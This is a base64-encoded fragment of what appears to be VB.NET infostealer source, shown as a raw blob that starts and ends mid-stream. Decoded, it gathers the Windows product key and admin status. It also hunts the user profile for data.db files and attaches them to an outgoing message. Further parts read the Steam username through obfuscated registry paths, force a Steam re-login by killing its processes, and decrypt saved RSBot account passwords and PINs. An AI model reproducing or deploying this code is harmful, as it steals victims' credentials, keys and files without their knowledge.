aXN0cmF0b3IpIFRoZW4NCiAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIklzIEFkbWlu OiAiICYgIlllcyIgJiB2Ym5ld2xpbmUpDQoJCQllbHNlDQoJCSAgIFsyNF0uWzg4XS5BcHBlbmRU ZXh0KCJJcyBBZG1pbjogIiAmICJObyIgJiB2Ym5ld2xpbmUpDQogICAgICAgIEVuZCBJZg0KCQkg ICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiT1M6ICIgJiBNeS5Db21wdXRlci5JbmZvLk9TRnVsbE5h bWUgJiB2Ym5ld2xpbmUpDQoJCSAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJQbGF0Zm9ybTogIiAm IHBsYXRmb3JtICYgdmJOZXdMaW5lKQ0KICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgi V2luZG93cyBLZXk6ICIgJiBTdHJSZXZlcnNlKEtFWVNUUklORykpDQogICAgICAgICAgIFsyNF0u Wzg4XS5BcHBlbmRUZXh0KHZibmV3bGluZSAmICJ+fn5+fn5+fn5+IiAmIHZiTmV3TGluZSkNCiAg ICAgICAgICAgIFJldHVybiBTdHJSZXZlcnNlKEtFWVNUUklORykNCg0KICAgICAgICBDYXRjaCBl eCBBcyBFeGNlcHRpb24NCg0KICAgICAgICBFbmQgVHJ5DQogICAgICAgIFJldHVybiBOb3RoaW5n DQogICAgRW5kIEZ1bmN0aW9uDQpFbmQgTW9kdWxlDQpNb2R1bGUgTmV4dXMNCiBQdWJsaWMgRnVu Y3Rpb24gZGJzdGVhbGVyKCkNCiB0cnkNCiAgICAgICBEaW0gQ291bnRlciBBcyBJbnRlZ2VyID0g MA0KICAgICAgICBEaW0gRm9sZGVyIEFzIE5ldyBJTy5EaXJlY3RvcnlJbmZvKEVudmlyb24oIlVT RVJQUk9GSUxFIikpDQogICAgICAgIEZvciBFYWNoIGZvdW5kRGlyZWN0b3J5IGFzIG9iamVjdCBJ biBGb2xkZXIuR2V0RGlyZWN0b3JpZXMNCiAgICAgICAgICAgIFRyeQ0KICAgICAgICAgICAgICAg IEZvciBFYWNoIGZvdW5kIEFzIElPLkRpcmVjdG9yeUluZm8gSW4gZm91bmREaXJlY3RvcnkuR2V0 RGlyZWN0b3JpZXMoIiouKiIsIElPLlNlYXJjaE9wdGlvbi5BbGxEaXJlY3RvcmllcykNCiAgICAg ICAgICAgICAgICAgICAgICAgIElmIGZvdW5kLkZ1bGxOYW1lLkNvbnRhaW5zKCJjb25maWciKSBU aGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSWYgTXkuQ29tcHV0ZXIuRmlsZVN5c3Rl bS5GaWxlRXhpc3RzKGZvdW5kLkZ1bGxOYW1lICYgIlxkYXRhLmRiIikgVGhlbg0KICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgRGltICBBdHRhY2htZW50MiA9IE5ldyBBdHRhY2htZW50KGZv dW5kLkZ1bGxOYW1lICYgIlxkYXRhLmRiIikNCgkJCQkJCSAgICAgICAgIFsyNF0uWzg4XS5BcHBl bmRUZXh0KHZibmV3bGluZSAmICJ+fn5+fk5leHVzfn5+fn4iICYgdmJuZXdsaW5lICYgIkZpbGUg Rm91bmQ6ICIgJiBmb3VuZC5GdWxsTmFtZSAmICJcZGF0YS5kYiIgJiB2Ym5ld2xpbmUgJiAifn5+ fn5OZXh1c35+fn5+IiAmIHZiTmV3TGluZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIFsyNF0u WzMyXS5BdHRhY2htZW50cy5BZGQoQXR0YWNobWVudDIpDQoJCQkJCQllbmQgaWYNCiAgICAgICAg ICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgTmV4dA0KICAgICAgICAgICAgQ2F0 Y2ggZXggQXMgVW5hdXRob3JpemVkQWNjZXNzRXhjZXB0aW9uDQogICAgICAgICAgICBFbmQgVHJ5 DQogICAgICAgIE5leHQNCgkJY2F0Y2ggZXggYXMgZXhjZXB0aW9uDQoJCWVuZCB0cnkgDQogICAg ICAgUmV0dXJuIFRydWUNCiAgICBFbmQgRnVuY3Rpb24NCglFbmQgTW9kdWxlDQpNb2R1bGUgU1MN CiAgICBGdW5jdGlvbiBHU1UoKQ0KICAgICAgICBUcnkNCiAgICAgICAgICAgIERpbSBUSEVQQVRI IEFzIFN0cmluZyA9IE15LkNvbXB1dGVyLlJlZ2lzdHJ5LkdldFZhbHVlKFs0Ml0oIlNFdEZXUT09 IikgJiAiX0NVUlJFTlRfVVNFUlwiICYgWzQyXSgiVTA5R1ZGZEJVa1U9IikgJiAiXCIgJiBbNDJd KCJWbUZzZG1VPSIpICYgIlwiICYgWzQyXSgiVTNSbFlXMD0iKSwgIlN0ZWFtUGF0aCIsICIiKQ0K ICAgICAgICAgICAgRGltIGZpZyBBcyBTdHJpbmcgPSBUSEVQQVRIICYgIlxjb25maWdcU3RlYW1B cHBEYXRhLnZkZiINCiAgICAgICAgICAgIERpbSBVc2VyKCkgQXMgU3RyaW5nID0gTXkuQ29tcHV0 ZXIuRmlsZVN5c3RlbS5SZWFkQWxsVGV4dChmaWcpLlNwbGl0KCIiIiIpDQogICAgICAgICAgICBJ ZiBVc2VyKDkpID0gIiIgVGhlbg0KICAgICAgICAgICAgICAgIFJldHVybiBOb3RoaW5nDQogICAg ICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgVXNlcig5KSA9IFVzZXIoOSkNCiAgICAgICAg ICAgICAgICBSZXR1cm4gVXNlcig5KQ0KCQkJCVsyNF0uWzg4XS5BcHBlbmRUZXh0KCJ+fn5+flN0 ZWFtfn5+fn4iICYgdmJuZXdsaW5lICYgIlN0ZWFtIFVzZXJuYW1lOiAiICYgVXNlcig5KSAmIHZi bmV3bGluZSAmICJ+fn5+flN0ZWFtfn5+fn4iICYgdmJuZXdsaW5lKQ0KICAgICAgICAgICAgRW5k IElmDQogICAgICAgIENhdGNoIGV4IEFzIEV4Y2VwdGlvbg0KICAgICAgICBFbmQgVHJ5DQogICAg ICAgIERpbSBDbCA9IE15LkNvbXB1dGVyLlJlZ2lzdHJ5LkN1cnJlbnRVc2VyLk9wZW5TdWJLZXko WzQyXSgiVTI5bWRIZGhjbVU9IikgJiAiXCIgJiBbNDJdKCJWbUZzZG1VPSIpICYgIlwiICYgWzQy XSgiVTNSbFlXMD0iKSwgVHJ1ZSkNCiAgICAgICAgQ2wuU2V0VmFsdWUoIlJlZnJlc2hMb2dpblJl cXVpcmVkIiwgMSkNCiAgICAgICAgQ2wuQ2xvc2UoKQ0KICAgICAgICBEaW0gc3AoKSBBcyBQcm9j ZXNzID0gU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MuR2V0UHJvY2Vzc2VzQnlOYW1lKCJTdGVh bSIpDQogICAgICAgIEZvciBFYWNoIHAgQXMgUHJvY2VzcyBJbiBzcA0KICAgICAgICAgICAgcC5L aWxsKCkNCiAgICAgICAgTmV4dA0KICAgIEVuZCBGdW5jdGlvbg0KRW5kIE1vZHVsZQ0KTW9kdWxl IFJTQlMNCiAgICBQdWJsaWMgRnVuY3Rpb24gU3RlYWwoKQ0KICAgICAgICBUcnkNCiAgICAgICAg ICAgIERpbSBBY2NvdW50ID0gTmV3IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3QoT2Yg UnNCb3RBY2NvdW50KShSc0JvdFV0aWwuR2V0TG9jYWxBY2NvdW50cygpKQ0KICAgICAgICAgICAg RGltIFBpbiBBcyBTdHJpbmcNCiAgICAgICAgICAgIEZvciBFYWNoIEluZm8gQXMgUnNCb3RBY2Nv dW50IEluIEFjY291bnQNCiAgICAgICAgICAgICAgICBJZiBJbmZvLlBpbiA9ICIiIFRoZW4gUGlu ID0gIk5vIFBpbiIgRWxzZSBQaW4gPSBJbmZvLlBpbg0KICAgICAgICAgICAgICAgIFsyNF0uWzg4 XS5BcHBlbmRUZXh0KHZibmV3bGluZSAmICJ+fn5+flJTQm90fn5+fn4iICYgdmJuZXdsaW5lICYg IlVzZXJuYW1lOiAiICYgSW5mby5Vc2VyTmFtZSAgJiB2Ym5ld2xpbmUgJiAiUGFzc3dvcmQ6ICIg KyBJbmZvLlBhc3N3b3JkICsgIHZibmV3bGluZSAgJiAiUGluOiAiICsgUGluICsgdmJuZXdsaW5l ICYgIn5+fn5+UlNCb3R+fn5+fiIgJiB2Ym5ld2xpbmUpDQogICAgICAgICAgICBOZXh0DQogICAg ICAgIENhdGNoIEV4IEFzIEV4Y2VwdGlvbg0KCQkNCiAgICAgICAgICAgRW5kIHRyeQ0KICAgICAg ICBFbmQgRnVuY3Rpb24NCiAgICANCiAgICBQdWJsaWMgTm90SW5oZXJpdGFibGUgQ2xhc3MgUnNC b3RVdGlsDQogICAgICAgIFByaXZhdGUgU3ViIE5ldygpDQogICAgICAgIEVuZCBTdWINCiAgICAg ICAgUHVibGljIENvbnN0IFNldHRpbmdzRmlsZU5hbWUgQXMgU3RyaW5nID0gIlJTQm90X0FjY291 bnRzLmluaSINCiAgICAgICAgUHVibGljIFNoYXJlZCBSZWFkT25seSBMb2NhbEtleSBBcyBCeXRl KCkNCiAgICAgICAgUHVibGljIFNoYXJlZCBSZWFkT25seSBTZXR0aW5nc0ZpbGUgQXMgU3RyaW5n ID0gUGF0aC5Db21iaW5lKEVudmlyb25tZW50LkdldEZvbGRlclBhdGgoRW52aXJvbm1lbnQuU3Bl Y2lhbEZvbGRlci5BcHBsaWNhdGlvbkRhdGEpLCBTZXR0aW5nc0ZpbGVOYW1lKQ0KICAgICAgICBQ cml2YXRlIENvbnN0IERlbGltaXRlciBBcyBDaGFyID0gImEiYw0KICAgICAgICBQcml2YXRlIENv bnN0IFVzZXJTdGFydENoYXJhY3RlciBBcyBTdHJpbmcgPSAiWyINCiAgICAgICAgUHJpdmF0ZSBD b25zdCBVc2VyRW5kQ2hhcmFjdGVyIEFzIFN0cmluZyA9ICJdIg0KICAgICAgICBQcml2YXRlIENv bnN0IFBhc3N3b3JkSGFzaEl0ZW0gQXMgU3RyaW5nID0gInBhc3N3b3JkIg0KICAgICAgICBQcml2 YXRlIENvbnN0IFBpbkl0ZW0gQXMgU3RyaW5nID0gInBpbiINCiAgICAgICAgUHJpdmF0ZSBDb25z dCBSZXdhcmRJdGVtIEFzIFN0cmluZyA9ICJyZXdhcmQiDQogICAgICAgIFByaXZhdGUgQ29uc3Qg VGFrZUJyZWFrc0l0ZW0gQXMgU3RyaW5nID0gInRha2VfYnJlYWtzIg0KICAgICAgICBQcml2YXRl IENvbnN0IE1lbWJlckl0ZW0gQXMgU3RyaW5nID0gIm1lbWJlciINCiAgICAgICAgUHJpdmF0ZSBD b25zdCBJc284ODU5MUNvZGVQYWdlIEFzIEludGVnZXIgPSAyODU5MQ0KICAgICAgICBQcml2YXRl IENvbnN0IElzbzg4NTkxUXVlc3Rpb25NYXJrIEFzIEJ5dGUgPSA2Mw0KDQogICAgICAgIFNoYXJl ZCBTdWIgTmV3KCkNCiAgICAgICAgICAgIExvY2FsS2V5ID0gZ2V0TG9jYWxLZXkoKQ0KICAgICAg ICBFbmQgU3ViDQoNCiAgICAgICAgUHVibGljIFNoYXJlZCBGdW5jdGlvbiBEZWNyeXB0UGFzc3dv cmQoQnlWYWwgcGFzc3dvcmRIYXNoIEFzIFN0cmluZykgQXMgU3RyaW5nDQogICAgICAgICAgICBS ZXR1cm4gRGVjcnlwdFBhc3N3b3JkKHBhc3N3b3JkSGFzaCwgTG9jYWxLZXkpDQogICAgICAgIEVu ZCBGdW5jdGlvbg0KDQogICAgICAgIFB1YmxpYyBTaGFyZWQgRnVuY3Rpb24gRGVjcnlwdFBhc3N3 b3JkKEJ5VmFsIHBhc3N3b3JkSGFzaCBBcyBTdHJpbmcsIEJ5VmFsIGtleSBBcyBCeXRlKCkpIEFz IFN0cmluZw0KICAgICAgICAgICAgSWYga2V5IElzIE5vdGhpbmcgVGhlbg0KICAgICAgICAgICAg ICAgIFRocm93IE5ldyBBcmd1bWVudE51bGxFeGNlcHRpb24oImtleSIpDQogICAgICAgICAgICBF bmQgSWYNCg0KICAgICAgICAgICAgSWYga2V5Lkxlbmd0aCA8PSAwIFRoZW4NCiAgICAgICAgICAg ICAgICBUaHJvdyBOZXcgQXJndW1lbnRPdXRPZlJhbmdlRXhjZXB0aW9uKCJrZXkgaXMgZW1wdHki KQ0KICAgICAgICAgICAgRW5kIElmDQoNCiAgICAgICAgICAgIElmIFN0cmluZy5Jc051bGxPckVt cHR5KHBhc3N3b3JkSGFzaCkgVGhlbg0KICAgICAgICAgICAgICAgIFRocm93IE5ldyBBcmd1bWVu dE51bGxFeGNlcHRpb24oInBhc3N3b3JkSGFzaCIpDQogICAgICAgICAgICBFbmQgSWYNCg0KICAg ICAgICAgICAgRGltIGhhc2hlZEtleSBBcyBCeXRlKCkgPSBOb3RoaW5nDQogICAgICAgICAgICBE aW0gc2lnbmVkSGFzaEtleSBBcyBTQnl0ZSgpID0gTm90aGluZw0KICAgICAgICAgICAgVXNpbmcg c2hhMSBBcyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTEgPSBTSEExTWFuYWdlZC5D cmVhdGUoKQ0KICAgICAgICAgICAgICAgIGhhc2hlZEtleSA9IHNoYTEuQ29tcHV0ZUhhc2goa2V5 KQ0KICAgICAgICAgICAgRW5kIFVzaW5nDQoNCiAgICAgICAgICAgIHNpZ25lZEhhc2hLZXkgPSBB cnJheS5Db252ZXJ0QWxsKE9mIEJ5dGUsIFNCeXRlKShoYXNoZWRLZXksIE5ldyBDb252ZXJ0ZXIo T2YgQnl0ZSwgU0J5dGUpKEFkZHJlc3NPZiBsYW1iZGFFKSkNCiAgICAgICAgICAgIERpbSBzcGxp dHRlZEhhc2ggQXMgU3RyaW5nKCkgPSBwYXNzd29yZEhhc2guU3BsaXQoRGVsaW1pdGVyKQ0KICAg ICAgICAgICAgSWYgc3BsaXR0ZWRIYXNoLkxlbmd0aCA8PSAwIFRoZW4NCiAgICAgICAgICAgICAg ICBUaHJvdyBOZXcgQXJndW1lbnRPdXRPZlJhbmdlRXhjZXB0aW9uKCJwYXNzd29yZEhhc2giLCAi aW52YWxpZCBwYXNzd29yZCBoYXNoIikNCiAgICAgICAgICAgIEVuZCBJZg0KDQogICAgICAgICAg ICBEaW0gcGFzc3dvcmQgQXMgQnl0ZSgpID0gTmV3IEJ5dGUoc3BsaXR0ZWRIYXNoLkxlbmd0aCAt IDEpIHt9DQoNCiAgICAgICAgICAgIERpbSBpIEFzIEludGVnZXIgPSAwDQogICAgICAgICAgICBX aGlsZSBpIDwgaGFzaGVkS2V5Lkxlbmd0aA0KICAgICAgICAgICAgICAgIElmIGkgPj0gc3BsaXR0 ZWRIYXNoLkxlbmd0aCBUaGVuDQogICAgICAgICAgICAgICAgICAgIFRocm93IE5ldyBBcmd1bWVu dE91dE9mUmFuZ2VFeGNlcHRpb24oImtleSIsICJpbnZhbGlkIGtleSIpDQogICAgICAgICAgICAg ICAgRW5kIElmDQoNCiAgICAgICAgICAgICAgICBEaW0gdmFsIEFzIEludGVnZXIgPSAtMQ0KICAg ICAgICAgICAgICAgIElmIE5vdCBJbnRlZ2VyLlRyeVBhcnNlKHNwbGl0dGVkSGFzaChpKSwgdmFs KSBUaGVuDQogICAgICAgICAgICAgICAgICAgIFRocm93IE5ldyBBcmd1bWVudE91dE9mUmFuZ2VF eGNlcHRpb24oInBhc3N3b3JkSGFzaCIsICJpbnZhbGlkIHBhc3N3b3JkIGhhc2giKQ0KICAgICAg ICAgICAgICAgIEVuZCBJZg0KDQogICAgICAgICAgICAgICAgRGltIHNiVmFsIEFzIFNCeXRlID0g Q1NCeXRlKHZhbCkNCiAgICAgICAgICAgICAgICBJZiBzYlZhbCA9IHNpZ25lZEhhc2hLZXkoaSkg VGhlbg0KICAgICAgICAgICAgICAgICAgICBFeGl0IFdoaWxlDQogICAgICAgICAgICAgICAgRW5k IElmDQoNCiAgICAgICAgICAgICAgICBEaW0gY2hhclZhbCBBcyBCeXRlID0gQ0J5dGUoc2JWYWwg LSBzaWduZWRIYXNoS2V5KGkpKQ0KICAgICAgICAgICAgICAgIHBhc3N3b3JkKGkpID0gY2hhclZh bA0KICAgICAgICAgICAgICAgIGkgKz0gMQ0KICAgICAgICAgICAgRW5kIFdoaWxlDQoNCiAgICAg ICAgICAgIFJldHVybiBFbmNvZGluZy5bRGVmYXVsdF0uR2V0U3RyaW5nKHBhc3N3b3JkLCAwLCBp KQ0KICAgICAgICBFbmQgRnVuY3Rpb24NCg0KICAgICAgICBQdWJsaWMgU2hhcmVkIEZ1bmN0aW9u IEdldExvY2FsQWNjb3VudHMoKSBBcyBSc0JvdEFjY291bnQoKQ0KICAgICAgICAgICAgSWYgTm90 IEZpbGUuRXhpc3RzKFNldHRpbmdzRmlsZSkgVGhlbg0KICAgICAgICAgICAgICAgIFRocm93IE5l dyBGaWxlTm90Rm91bmRFeGNlcHRpb24oImNvdWxkIG5vdCBmaW5kIGFjY291bnRzIGZpbGUiKQ0K ICAgICAgICAgICAgRW5kIElmDQoNCiAgICAgICAgICAgIFVzaW5nIHJlYWRlciBBcyBOZXcgU3Ry ZWFtUmVhZGVyKFNldHRpbmdzRmlsZSkNCiAgICAgICAgICAgICAgICBSZXR1cm4gR2V0TG9jYWxB Y2NvdW50cyhyZWFkZXIuUmVhZFRvRW5kKCksIExvY2FsS2V5KQ0KICAgICAgICAgICAgRW5kIFVz aW5nDQogICAgICAgIEVuZCBGdW5jdGlvbg0KDQogICAgICAgIFB1YmxpYyBTaGFyZWQgRnVuY3Rp b24gR2V0TG9jYWxBY2NvdW50cyhCeVZhbCBrZXkgQXMgQnl0ZSgpKSBBcyBSc0JvdEFjY291bnQo KQ0KICAgICAgICAgICAgSWYgTm90IEZpbGUuRXhpc3RzKFNldHRpbmdzRmlsZSkgVGhlbg0KICAg ICAgICAgICAgICAgIFRocm93IE5ldyBGaWxlTm90Rm91bmRFeGNlcHRpb24oImNvdWxkIG5vdCBm aW5kIGFjY291bnRzIGZpbGUiKQ0KICAgICAgICAgICAgRW5kIElmDQoNCiAgICAgICAgICAgIFVz aW5nIHJlYWRlciBBcyBOZXcgU3RyZWFtUmVhZGVyKFNldHRpbmdzRmlsZSkNCiAgICAgICAgICAg ICAgICBSZXR1cm4gR2V0TG9jYWxBY2NvdW50cyhyZWFkZXIuUmVhZFRvRW5kKCksIGtleSkNCiAg ICAgICAgICAgIEVuZCBVc2luZw0KICAgICAgICBFbmQgRnVuY3Rpb24NCiAgICAgICAgUHVibGlj IFNoYXJlZCBGdW5jdGlvbiBsYW1iZGFFKEJ5VmFsIG8gQXMgQnl0ZSkgQXMgU0J5dGUNCiAgICAg ICAgICAgIFJldHVybiBDU0J5dGUobykNCiAgICAgICAgRW5kIEZ1bmN0aW9uDQoNCiAgICAgICAg UHVibGljIFNoYXJlZCBGdW5jdGlvbiBHZXRMb2NhbEFjY291bnRzKEJ5VmFsIGFjY291bnRGaWxl RGF0YSBBcyBTdHJpbmcsIEJ5VmFsIGtleSBBcyBCeXRlKCkpIEFzIFJzQm90QWNjb3VudCgpDQog ICAgICAgICAgICBJZiBOb3QgRmlsZS5FeGlzdHMoU2V0dGluZ3NGaWxlKSBUaGVuDQogICAgICAg ICAgICAgICAgVGhyb3cgTmV3IEZpbGVOb3RGb3VuZEV4Y2VwdGlvbigiY291bGQgbm90IGZpbmQg YWNjb3VudHMgZmlsZSIpDQogICAgICAgICAgICBFbmQgSWYNCg0KICAgICAgICAgICAgRGltIHJl dCBBcyBOZXcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdChPZiBSc0JvdEFjY291bnQp KCkNCiAgICAgICAgICAgIERpbSBzcGxpdCBBcyBTdHJpbmcoKSA9IGFjY291bnRGaWxlRGF0YS5T cGxpdChOZXcgU3RyaW5nKCkge0Vudmlyb25tZW50Lk5ld0xpbmV9LCBTdHJpbmdTcGxpdE9wdGlv bnMuUmVtb3ZlRW1wdHlFbnRyaWVzKQ0KICAgICAgICAgICAgRm9yIGkgQXMgSW50ZWdlciA9IDAg VG8gc3BsaXQuTGVuZ3RoIC0gMQ0KICAgICAgICAgICAgICAgIElmIE5vdCBzcGxpdChpKS5TdGFy dHNXaXRoKFVzZXJTdGFydENoYXJhY3RlcikgVGhlbg0KICAgICAgICAgICAgICAgICAgICBDb250 aW51ZSBGb3INCiAgICAgICAgICAgICAgICBFbmQgSWYNCg0KICAgICAgICAgICAgICAgIERpbSB1 c2VybmFtZSBBcyBTdHJpbmcgPSBzcGxpdChpKS5SZXBsYWNlKFVzZXJTdGFydENoYXJhY3Rlciwg U3RyaW5nLkVtcHR5KS5SZXBsYWNlKFVzZXJFbmRDaGFyYWN0ZXIsIFN0cmluZy5FbXB0eSkNCiAg ICAgICAgICAgICAgICBEaW0gcGFzc3dvcmRIYXNoIEFzIFN0cmluZyA9IE5vdGhpbmcNCiAgICAg ICAgICAgICAgICBEaW0gcGFzc3dvcmQgQXMgU3RyaW5nID0gTm90aGluZw0KICAgICAgICAgICAg ICAgIERpbSBwaW4gQXMgU3RyaW5nID0gTm90aGluZw0KICAgICAgICAgICAgICAgIERpbSByZXdh cmQgQXMgU3RyaW5nID0gTm90aGluZw0KICAgICAgICAgICAgICAgIERpbSB0YWtlQnJlYWtzIEFz IFN5c3RlbS5OdWxsYWJsZShPZiBCb29sZWFuKSA9IE5vdGhpbmcNCiAgICAgICAgICAgICAgICBE aW0gbWVtYmVyIEFzIFN5c3RlbS5OdWxsYWJsZShPZiBCb29sZWFuKSA9IE5vdGhpbmcNCg0KICAg ICAgICAgICAgICAgIERpbSBqIEFzIEludGVnZXIgPSBpICsgMQ0KICAgICAgICAgICAgICAgIFdo aWxlIGogPCBzcGxpdC5MZW5ndGggQW5kQWxzbyBOb3Qgc3BsaXQoaikuU3RhcnRzV2l0aChVc2Vy U3RhcnRDaGFyYWN0ZXIpDQogICAgICAgICAgICAgICAgICAgIERpbSBzdGFydEVxdWFscyBBcyBJ bnRlZ2VyID0gc3BsaXQoaikuSW5kZXhPZigiPSJjKQ0KICAgICAgICAgICAgICAgICAgICBJZiBz dGFydEVxdWFscyA8PSAwIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIEV4aXQgV2hpbGUN CiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQoNCiAgICAgICAgICAgICAgICAgICAgRGltIGl0 ZW0gQXMgU3RyaW5nID0gc3BsaXQoaikuU3Vic3RyaW5nKDAsIHN0YXJ0RXF1YWxzKQ0KICAgICAg ICAgICAgICAgICAgICBEaW0gdmFsdWUgQXMgU3RyaW5nID0gc3BsaXQoaikuU3Vic3RyaW5nKHN0 YXJ0RXF1YWxzICsgMSwgc3BsaXQoaikuTGVuZ3RoIC0gc3RhcnRFcXVhbHMgLSAxKQ0KICAgICAg ICAgICAgICAgICAgICBTZWxlY3QgQ2FzZSBpdGVtDQogICAgICAgICAgICAgICAgICAgICAgICBD YXNlIFBhc3N3b3JkSGFzaEl0ZW0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzd29y ZEhhc2ggPSB2YWx1ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3N3b3JkID0gUnNC b3RVdGlsLkRlY3J5cHRQYXNzd29yZChwYXNzd29yZEhhc2gsIGtleSkNCiAgICAgICAgICAgICAg ICAgICAgICAgICAgICBFeGl0IFNlbGVjdA0KICAgICAgICAgICAgICAgICAgICAgICAgQ2FzZSBQ aW5JdGVtDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGluID0gdmFsdWUNCiAgICAgICAg ICAgICAgICAgICAgICAgICAgICBFeGl0IFNlbGVjdA0KICAgICAgICAgICAgICAgICAgICAgICAg Q2FzZSBSZXdhcmRJdGVtDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV3YXJkID0gdmFs dWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFeGl0IFNlbGVjdA0KICAgICAgICAgICAg ICAgICAgICAgICAgQ2FzZSBUYWtlQnJlYWtzSXRlbQ0KICAgICAgICAgICAgICAgICAgICAgICAg ICAgIElmIFRydWUgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaW0gdG1w IEFzIEJvb2xlYW4gPSBGYWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWtl QnJlYWtzID0gQm9vbGVhbi5UcnlQYXJzZSh2YWx1ZSwgdG1wKSBBbmRBbHNvIHRtcA0KICAgICAg ICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgICAgICAgICAgICAg IEV4aXQgU2VsZWN0DQogICAgICAgICAgICAgICAgICAgICAgICBDYXNlIE1lbWJlckl0ZW0NCiAg ICAgICAgICAgICAgICAgICAgICAgICAgICBJZiBUcnVlIFRoZW4NCiAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgRGltIHRtcCBBcyBCb29sZWFuID0gRmFsc2UNCiAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgbWVtYmVyID0gQm9vbGVhbi5UcnlQYXJzZSh2YWx1ZSwgdG1wKSBB bmRBbHNvIHRtcA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAg ICAgICAgICAgICAgICAgICAgIEV4aXQgU2VsZWN0DQogICAgICAgICAgICAgICAgICAgICAgICBD YXNlIEVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFeGl0IFNlbGVjdA0KICAgICAg ICAgICAgICAgICAgICBFbmQgU2VsZWN0DQogICAgICAgICAgICAgICAgICAgIGogKz0gMQ0KICAg ICAgICAgICAgICAgICAgICBpICs9IDENCiAgICAgICAgICAgICAgICBFbmQgV2hpbGUNCg0KICAg ICAgICAgICAgICAgIERpbSBhY2NvdW50IEFzIE5ldyBSc0JvdEFjY291bnQodXNlcm5hbWUsIHBh c3N3b3JkLCBwYXNzd29yZEhhc2gsIHBpbiwgcmV3YXJkLCB0YWtlQnJlYWtzLCBtZW1iZXIpDQog ICAgICAgICAgICAgICAgcmV0LkFkZChhY2NvdW50KQ0KICAgICAgICAgICAgTmV4dA0KDQogICAg ICAgICAgICBSZXR1cm4gcmV0LlRvQXJyYXkoKQ0KICAgICAgICBFbmQgRnVuY3Rpb24NCg0KICAg ICAgICBQdWJsaWMgU2hhcmVkIEZ1bmN0aW9uIENvbnZlcnRCeXRlRW5jb2RpbmcoQnlWYWwga2V5 IEFzIEJ5dGUoKSkgQXMgQnl0ZSgpDQogICAgICAgICAgICBEaW0gcmV0IEFzIEJ5dGUoKSA9IE5l dyBCeXRlKGtleS5MZW5ndGggLSAxKSB7fQ0KICAgICAgICAgICAgQXJyYXkuQ29weShrZXksIHJl dCwga2V5Lkxlbmd0aCkNCg0KICAgICAgICAgICAgRm9yIGkgQXMgSW50ZWdlciA9IDAgVG8gcmV0 Lkxlbmd0aCAtIDENCiAgICAgICAgICAgICAgICBJZiBOb3QgaXNWYWxpZElzbzg4NTkxKHJldChp KSkgVGhlbg0KICAgICAgICAgICAgICAgICAgICByZXQoaSkgPSBJc284ODU5MVF1ZXN0aW9uTWFy aw0KICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgTmV4dA0KDQogICAgICAgICAg ICBSZXR1cm4gcmV0DQogICAgICAgIEVuZCBGdW5jdGlvbg0KDQogICAgICAgIFByaXZhdGUgU2hh cmVkIEZ1bmN0aW9uIGdldExvY2FsS2V5KCkgQXMgQnl0ZSgpDQogICAgICAgICAgICBEaW0ga2V5 IEFzIEJ5dGUoKQ0KICAgICAgICAgICAgRGltIGludGVyZmFjZXMgQXMgTmV0d29ya0ludGVyZmFj ZSgpID0gTmV0d29ya0ludGVyZmFjZS5HZXRBbGxOZXR3b3JrSW50ZXJmYWNlcygpDQogICAgICAg ICAgICBEaW0gbG93ZXN0SW5kZXggQXMgSW50ZWdlciA9IC0xDQogICAgICAgICAgICBEaW0gbG93 ZXN0SW50ZXJmYWNlSW5kZXggQXMgSW50ZWdlciA9IC0xDQogICAgICAgICAgICBGb3IgaSBBcyBJ bnRlZ2VyID0gMCBUbyBpbnRlcmZhY2VzLkxlbmd0aCAtIDENCiAgICAgICAgICAgICAgICBJZiBp bnRlcmZhY2VzKGkpLk9wZXJhdGlvbmFsU3RhdHVzIDw+IE9wZXJhdGlvbmFsU3RhdHVzLlVwIFRo ZW4NCiAgICAgICAgICAgICAgICAgICAgQ29udGludWUgRm9yDQogICAgICAgICAgICAgICAgRW5k IElmDQoNCiAgICAgICAgICAgICAgICBEaW0gaXBQcm9wZXJ0aWVzIEFzIElQSW50ZXJmYWNlUHJv cGVydGllcyA9IGludGVyZmFjZXMoaSkuR2V0SVBQcm9wZXJ0aWVzKCkNCiAgICAgICAgICAgICAg ICBJZiBpcFByb3BlcnRpZXMgSXMgTm90aGluZyBUaGVuDQogICAgICAgICAgICAgICAgICAgIENv bnRpbnVlIEZvcg0KICAgICAgICAgICAgICAgIEVuZCBJZg0KDQogICAgICAgICAgICAgICAgRGlt IGlwdjRQcm9wZXJ0aWVzIEFzIElQdjRJbnRlcmZhY2VQcm9wZXJ0aWVzID0gaXBQcm9wZXJ0aWVz LkdldElQdjRQcm9wZXJ0aWVzKCkNCiAgICAgICAgICAgICAgICBJZiBpcHY0UHJvcGVydGllcyBJ cyBOb3RoaW5nIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgQ29udGludWUgRm9yDQogICAgICAg 